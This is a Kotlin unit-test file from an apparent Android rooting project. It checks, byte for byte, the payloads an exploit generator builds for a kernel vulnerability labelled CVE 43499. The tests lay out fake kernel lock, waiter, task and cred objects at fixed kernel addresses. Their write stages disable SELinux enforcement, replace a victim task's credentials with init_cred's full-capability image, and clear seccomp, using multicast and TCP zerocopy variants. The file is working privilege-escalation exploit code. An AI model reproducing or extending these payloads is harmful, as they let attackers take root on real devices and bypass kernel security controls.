package com.ghostlock.app.backend.backends.cve43499.generator

import com.ghostlock.app.backend.backends.cve43499.flow.Cve43499WriteStageId
import com.ghostlock.app.backend.backends.cve43499.lifecycle.Cve43499PlacementFacts
import com.ghostlock.app.backend.backends.cve43499.config.Cve43499DebugConfig
import com.ghostlock.app.backend.backends.cve43499.config.DebugInjection
import com.ghostlock.app.backend.backends.cve43499.config.DebugPrimitiveKind
import java.io.File
import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Assert.fail
import org.junit.Test

/**
 * R3d Credential/W1b/W3/fast-repair 字节向量对拍（与 legacy/legacy2 常量逐字节）。
 *
 * @note 期望值全部用手写 legacy 常量独立构造（0x798/1944/0x860/0x108/0x1080/0x6800/
 *   0xffff...、cred copy 的 usage/caps/ref 槽），不复用 generator 内部逻辑。
 * @note 纯 JVM 单测；不触 Native、不触 Android。
 */
class Cve43499CredentialWriteVectorTest {
    private val debug = Cve43499DebugConfig.parse(readDebugAsset())
    private val execution = Cve43499DebugConfig.executionParameters()
    private val context = Cve43499GeneratorContext(debug, execution, GHOST_PID)

    /* ---------- legacy 目标常量（独立字面量，非配置读取） ---------- */

    private val directMapBase = 0xffffff8000000000uL.toLong()
    private val base = 0xffffff8800210000uL.toLong()
    private val victimTask = 0xffffff8800100000uL.toLong()
    private val initCredAlias = 0xffffff802abfd588uL.toLong()
    private val initTaskAlias = 0xffffff802ac43400uL.toLong()
    private val rootTaskGroupAlias = 0xffffff802ad58ac0uL.toLong()
    private val payloadBase = base - 0xe80L
    private val fakeLock = payloadBase + 0xe80L
    private val fakeW0 = payloadBase + 0x1180L
    private val fakeTask = payloadBase + 0x1280L

    private val facts = Cve43499PlacementFacts(
        candidatePageBase = base,
        pageSize = 0x1000L,
        allocationSize = 0x8000L,
        requiredAlignment = 0x8000L,
        measuredObjectAddress = 0xffffff8800211234uL.toLong(),
        measurementRounds = 3L,
        retainedChildCount = 0L,
        retainedDescriptorCount = 0L,
    )

    @Test
    fun `planner derives legacy targets for every write stage`() {
        val planner = Cve43499DebugWritePlanner(context)
        /* W1：selinux_enforcing alias（offset 47885704）。 */
        assertEquals(
            directMapBase or (0x28000000L + 47885704L),
            planner.w1().target,
        )
        assertEquals(Cve43499WriteMode.ZERO, planner.w1().mode)
        assertTrue(planner.w1().preserveChild)
        /* W1b：W1 页基址 + buffer_size=264（归档 target 以 …0108 结尾）。 */
        assertEquals(base + 264L, planner.w1b(base).target)
        assertEquals(Cve43499WriteMode.ZERO, planner.w1b(base).mode)
        assertEquals(false, planner.w1b(base).preserveChild)
        /* W2：task + task_struct.cred=1944 ⇒ …0798（归档同族）。 */
        assertEquals(victimTask + 1944L, planner.credential(victimTask).target)
        assertEquals(Cve43499WriteMode.CREDENTIAL, planner.credential(victimTask).mode)
        assertTrue(planner.credential(victimTask).preserveChild)
        /* W2b：init_cred alias + 8（legacy2 w2_fast_repair）。 */
        assertEquals(initCredAlias + 8L, planner.fastRepair().target)
        assertEquals(false, planner.fastRepair().preserveChild)
        /* W3-0：task + comm=1960；W3：thread_info.flags=+0 / seccomp=+2144。 */
        assertEquals(victimTask + 1960L, planner.w3CommProbe(victimTask).target)
        assertEquals(victimTask, planner.w3Flags(victimTask, false, 0L).target)
        assertEquals(victimTask - 8L, planner.w3Flags(victimTask, true, 0L).target)
        assertEquals(victimTask + 2144L, planner.w3SeccompMode(victimTask, false).target)
        assertEquals(victimTask + 2136L, planner.w3SeccompMode(victimTask, true).target)
    }

    @Test
    fun `multicast credential write matches legacy compact waiter and cred image bytes`() {
        val request = context.credentialWriteRequest(victimTask)
        val generated = Cve43499MulticastInputGenerator(context)
            .generateForWrite(facts, request)
        val target = victimTask + 1944L
        val expected = ByteArray(0x10000)
        val writer = Expected(expected)
        for (chunk in listOf(0L, 0x8000L)) {
            val at = chunk
            /* lock 槽（0xe80）。 */
            writer.u32(at + 0x0e80L, 0L)
            writer.u64(at + 0x0e88L, fakeW0)
            writer.u64(at + 0x0e90L, fakeW0)
            writer.u64(at + 0x0e98L, fakeTask or 1L)
            /* compact waiter：value=init_cred alias（Credential），left=target。 */
            writer.u64(at + 0x1180L, 1L)
            writer.u64(at + 0x1188L, 0L)
            writer.u64(at + 0x1190L, 0L)
            writer.u64(at + 0x1198L, initCredAlias)
            writer.u64(at + 0x11a0L, 0L)
            writer.u64(at + 0x11a8L, target)
            writer.u64(at + 0x11b0L, initTaskAlias)
            writer.u64(at + 0x11b8L, fakeLock)
            writer.u32(at + 0x11c0L, 0L)
            writer.u32(at + 0x11c4L, 140L)
            writer.u64(at + 0x11c8L, 0L)
            writer.u64(at + 0x11d0L, 0L)
            /* 假 task（compact 偏移与 W1 相同）。 */
            writer.u32(at + 0x1280L + 0x40L, 0x100L)
            writer.u32(at + 0x1280L + 124L, 120L)
            writer.u32(at + 0x1280L + 132L, 120L)
            writer.u32(at + 0x1280L + 2180L, 0L)
            writer.u64(at + 0x1280L + 2200L, 0L)
            writer.u64(at + 0x1280L + 2208L, 0L)
            writer.u64(at + 0x1280L + 1024L, rootTaskGroupAlias)
            writer.u64(at + 0x1280L + 2216L, initTaskAlias)
            writer.u64(at + 0x1280L + 2224L, 0L)
            /* rb 右/左节点：parent=target-8。 */
            writer.u64(at + 0x1240L, target - 8L)
            writer.u64(at + 0x1248L, 0L)
            writer.u64(at + 0x1250L, 0L)
            writer.u64(at + 0x1260L, target - 8L)
            writer.u64(at + 0x1268L, 0L)
            writer.u64(at + 0x1270L, 0L)
            /* cred 镜像 @0x1080（copy_size=176/0xb0，usage@0=0x100，caps@48..）
             * ref 槽 @128/136/144/152 = image 绝对地址的 direct-map 别名。 */
            writer.u32(at + 0x1080L, 0x100L)
            for (index in 0 until 3) {
                writer.u64(at + 0x1080L + 48L + index * 8L, 0x1FFFFFFFFFFL)
            }
            writer.u64(at + 0x1080L + 128L, 0xffffff802ab23a80uL.toLong())
            writer.u64(at + 0x1080L + 136L, 0xffffff802acce110uL.toLong())
            writer.u64(at + 0x1080L + 144L, 0xffffff802ab23ff0uL.toLong())
            writer.u64(at + 0x1080L + 152L, 0xffffff802ab23b28uL.toLong())
        }
        assertTrue("credential landing 逐字节不一致", expected.contentEquals(generated.landing.finalBytes))
        /* Credential 不是 W1 值写：无页接受判据。 */
        assertEquals(0L, generated.landing.pageAcceptRequired)
        assertEquals(0L, generated.landing.pageAcceptOffset)
        assertEquals(0L, generated.landing.pageAcceptBit)
        /* 三地址仍由本事务页派生。 */
        assertEquals(fakeW0, generated.primitive.finalWaiterAddress)
        assertEquals(fakeTask, generated.primitive.finalTaskAddress)
        assertEquals(fakeLock, generated.primitive.finalLockAddress)
    }

    @Test
    fun `tcp credential write places cred image at legacy tcp copy offset`() {
        val tcpDebug = debug.copy(
            injection = DebugInjection(DebugPrimitiveKind.TCP_ZEROCOPY),
        )
        val tcpContext = Cve43499GeneratorContext(tcpDebug, execution, GHOST_PID)
        val request = tcpContext.credentialWriteRequest(victimTask)
        val generated = Cve43499TcpZerocopyInputGenerator(tcpContext)
            .generateForWrite(facts, request)
        val tcpLanding = generated.landing.finalBytes
        val tcpPayloadBase = base /* tcp_payload_delta=0 */
        val tcpFakeLock = tcpPayloadBase + 0xe80L
        val reader = Expected(tcpLanding)
        for (chunk in listOf(0L, 0x8000L)) {
            val at = chunk + 0xe80L
            assertEquals(initCredAlias, reader.getU64(at + 0x1198L))
            assertEquals(victimTask + 1944L, reader.getU64(at + 0x11a8L))
            assertEquals(tcpFakeLock, reader.getU64(at + 0x11b8L))
            /* cred 镜像 @chunk_bias+0x6800（tcp 专用槽，不是 0x1080）。 */
            assertEquals(0x100L, reader.getU32(at + 0x6800L))
            assertEquals(0x1FFFFFFFFFFL, reader.getU64(at + 0x6800L + 48L))
            assertEquals(0xffffff802ab23a80uL.toLong(), reader.getU64(at + 0x6800L + 128L))
            /* 0x1080 槽在 tcp 布局里不应出现 cred 镜像（fake_task 区）。 */
            assertEquals(0L, reader.getU32(at + 0x1080L))
        }
        assertEquals(0L, generated.landing.pageAcceptRequired)
    }

    @Test
    fun `w1b leaf write matches legacy zero-leaf payload and has no page accept`() {
        val generated = Cve43499MulticastInputGenerator(context).generateForWrite(
            facts,
            context.w1bWriteRequest(base),
        )
        val target = base + 264L
        val expected = ByteArray(0x10000)
        val writer = Expected(expected)
        for (chunk in listOf(0L, 0x8000L)) {
            val at = chunk
            writer.u32(at + 0x0e80L, 0L)
            writer.u64(at + 0x0e88L, fakeW0)
            writer.u64(at + 0x0e90L, fakeW0)
            writer.u64(at + 0x0e98L, fakeTask or 1L)
            writer.u64(at + 0x1180L, 1L)
            writer.u64(at + 0x1188L, 0L)
            writer.u64(at + 0x1190L, 0L)
            /* leaf 臂：pc=target-8、right=0、left=0。 */
            writer.u64(at + 0x1198L, target - 8L)
            writer.u64(at + 0x11a0L, 0L)
            writer.u64(at + 0x11a8L, 0L)
            writer.u64(at + 0x11b0L, initTaskAlias)
            writer.u64(at + 0x11b8L, fakeLock)
            writer.u32(at + 0x11c0L, 0L)
            writer.u32(at + 0x11c4L, 140L)
            writer.u64(at + 0x11c8L, 0L)
            writer.u64(at + 0x11d0L, 0L)
            writer.u32(at + 0x1280L + 0x40L, 0x100L)
            writer.u32(at + 0x1280L + 124L, 120L)
            writer.u32(at + 0x1280L + 132L, 120L)
            writer.u32(at + 0x1280L + 2180L, 0L)
            writer.u64(at + 0x1280L + 2200L, 0L)
            writer.u64(at + 0x1280L + 2208L, 0L)
            writer.u64(at + 0x1280L + 1024L, rootTaskGroupAlias)
            writer.u64(at + 0x1280L + 2216L, initTaskAlias)
            writer.u64(at + 0x1280L + 2224L, 0L)
            writer.u64(at + 0x1240L, target - 8L)
            writer.u64(at + 0x1260L, target - 8L)
        }
        assertTrue("w1b leaf landing 不一致", expected.contentEquals(generated.landing.finalBytes))
        assertEquals(0L, generated.landing.pageAcceptRequired)
    }

    @Test
    fun `w3 seccomp and fast repair leaf writes use legacy targets`() {
        val planner = Cve43499DebugWritePlanner(context)
        val seccompRequest = planner.w3SeccompMode(victimTask, false)
        val fastRepairRequest = planner.fastRepair()
        val seccompLanding = Cve43499MulticastInputGenerator(context)
            .generateForWrite(facts, seccompRequest).landing
        val repairLanding = Cve43499MulticastInputGenerator(context)
            .generateForWrite(facts, fastRepairRequest).landing
        assertEquals(victimTask + 2144L - 8L, Expected(seccompLanding.finalBytes).getU64(0x1198L))
        assertEquals(0L, Expected(seccompLanding.finalBytes).getU64(0x11a0L))
        assertEquals(0L, Expected(seccompLanding.finalBytes).getU64(0x11a8L))
        assertEquals(initCredAlias + 8L - 8L, Expected(repairLanding.finalBytes).getU64(0x1198L))
        assertEquals(0L, seccompLanding.pageAcceptRequired)
        assertEquals(0L, repairLanding.pageAcceptRequired)
    }

    /* ---------- 负例：非法请求/布局必须具名拒绝 ---------- */

    @Test
    fun `credential layout refuses leaf semantics`() {
        val request = context.credentialWriteRequest(victimTask).copy(preserveChild = false)
        try {
            writeLayout(request, base, debug.generator.payload, 8L, initCredAlias)
            fail("credential + leaf must be rejected")
        } catch (problem: Cve43499GeneratorException) {
            assertEquals("write-layout:credential-requires-preserve-child", problem.reason)
        }
    }

    @Test
    fun `credential layout refuses missing init cred alias`() {
        val request = context.credentialWriteRequest(victimTask)
        try {
            writeLayout(request, base, debug.generator.payload, 8L, 0L)
            fail("missing init_cred alias must be rejected")
        } catch (problem: Cve43499GeneratorException) {
            assertEquals("write-layout:credential-init-cred-alias-missing", problem.reason)
        }
    }

    @Test
    fun `leaf writes must not carry a value`() {
        val request = context.w1bWriteRequest(base)
        val layout = writeLayout(request, base, debug.generator.payload, 8L)
        assertEquals(0L, layout.value)
        assertEquals(request.target - 8L, layout.parent)
        assertTrue(layoutMatchesRequest(request, layout))
    }

    @Test
    fun `write stage ids keep legacy tokens`() {
        assertEquals(
            listOf("w1", "w1b", "w2", "w2b", "w3"),
            Cve43499WriteStageId.entries.map { it.token },
        )
    }

    /* ---------- 工具 ---------- */

    private fun readDebugAsset(): String {
        val candidates = listOf(
            File("src/debug/assets/profile/43499/debug-a301so.conf"),
            File("../src/debug/assets/profile/43499/debug-a301so.conf"),
            File("app/src/debug/assets/profile/43499/debug-a301so.conf"),
        )
        return candidates.firstOrNull { it.isFile }?.readText()
            ?: error("debug asset not found from ${File(".").absolutePath}")
    }

    /** 独立的小端期望读写器（只用于测试对拍；越界即测试失败）。 */
    private class Expected(private val bytes: ByteArray) {
        fun u32(offset: Long, value: Long) = put(offset, 4, value)

        fun u64(offset: Long, value: Long) = put(offset, 8, value)

        fun getU32(offset: Long): Long = get(offset, 4)

        fun getU64(offset: Long): Long = get(offset, 8)

        private fun put(offset: Long, width: Int, value: Long) {
            check(offset >= 0 && offset + width <= bytes.size) { "oob $offset/$width" }
            for (index in 0 until width) {
                bytes[offset.toInt() + index] = ((value ushr (8 * index)) and 0xffL).toByte()
            }
        }

        private fun get(offset: Long, width: Int): Long {
            check(offset >= 0 && offset + width <= bytes.size) { "oob $offset/$width" }
            var value = 0L
            for (index in 0 until width) {
                value = value or
                    ((bytes[offset.toInt() + index].toLong() and 0xffL) shl (8 * index))
            }
            return value
        }
    }

    private companion object {
        private const val GHOST_PID = 4242
    }
}
